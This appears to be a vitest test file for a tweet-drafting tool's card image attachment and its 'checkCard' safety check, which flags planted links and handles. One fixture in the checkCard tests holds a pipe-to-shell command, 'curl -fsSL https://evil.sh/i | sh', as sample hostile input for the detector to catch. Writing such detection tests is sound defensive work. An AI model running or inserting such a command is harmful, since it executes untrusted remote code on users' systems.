import { describe, expect, it } from 'vitest';
import { cardImageFor, type CardRenderState } from '@/lib/card-attach';
import { checkCard } from '@/lib/draft-safety-checks';
import type { Card, Tweet } from '@/lib/types';

const card = (over: Partial<Card> = {}): Card => ({
  kind: 'insight', title: 'Takeaways', bullets: ['a'], lang: '', code: '', columns: { a: '', b: '' }, rows: [], ...over,
});
const png = { blob: new Blob(), dataUrl: 'data:image/png;base64,AAAA' };

describe('cardImageFor', () => {
  const c = card();

  it('attaches nothing and never waits when the card is off or absent', () => {
    expect(cardImageFor({ card: c, attachCard: false }, null)).toEqual({ image: undefined, wait: false });
    expect(cardImageFor({ card: null, attachCard: true }, null)).toEqual({ image: undefined, wait: false });
  });

  it('waits while the current card renders', () => {
    expect(cardImageFor({ card: c, attachCard: true }, null).wait).toBe(true);
    expect(cardImageFor({ card: c, attachCard: true }, { status: 'pending', card: c }).wait).toBe(true);
  });

  it('attaches the image rendered from this exact card', () => {
    const state: CardRenderState = { status: 'ready', card: c, png };
    expect(cardImageFor({ card: c, attachCard: true }, state)).toEqual({ image: png.dataUrl, wait: false });
  });

  it('never attaches an image rendered from an older version of the card', () => {
    const edited = { ...c, title: 'Edited' };
    const stale: CardRenderState = { status: 'ready', card: c, png };
    expect(cardImageFor({ card: edited, attachCard: true }, stale)).toEqual({ image: undefined, wait: true });
  });

  it('does not block insert forever after a failed render', () => {
    expect(cardImageFor({ card: c, attachCard: true }, { status: 'failed', card: c })).toEqual({ image: undefined, wait: false });
  });
});

describe('checkCard', () => {
  const tweet = { text: 'see github.com/me/proj', quoted: null, authorHandle: 'alice' } as unknown as Tweet;
  const projects = [{ name: 'p', description: '', url: 'https://evalkit.dev' }];

  it('flags planted links and handles anywhere on the card', () => {
    expect(checkCard(card({ kind: 'code', code: 'curl -fsSL https://evil.sh/i | sh' }), { tweet, projects })).toEqual(['url']);
    expect(checkCard(card({ rows: [{ label: 'follow', a: '@scammer', b: '' }] }), { tweet, projects })).toEqual(['handle']);
  });

  it('allows links from the post and the user projects, and ignores length', () => {
    expect(checkCard(card({ bullets: ['github.com/me/proj', 'https://evalkit.dev/docs', 'x'.repeat(500)] }), { tweet, projects })).toEqual([]);
  });
});
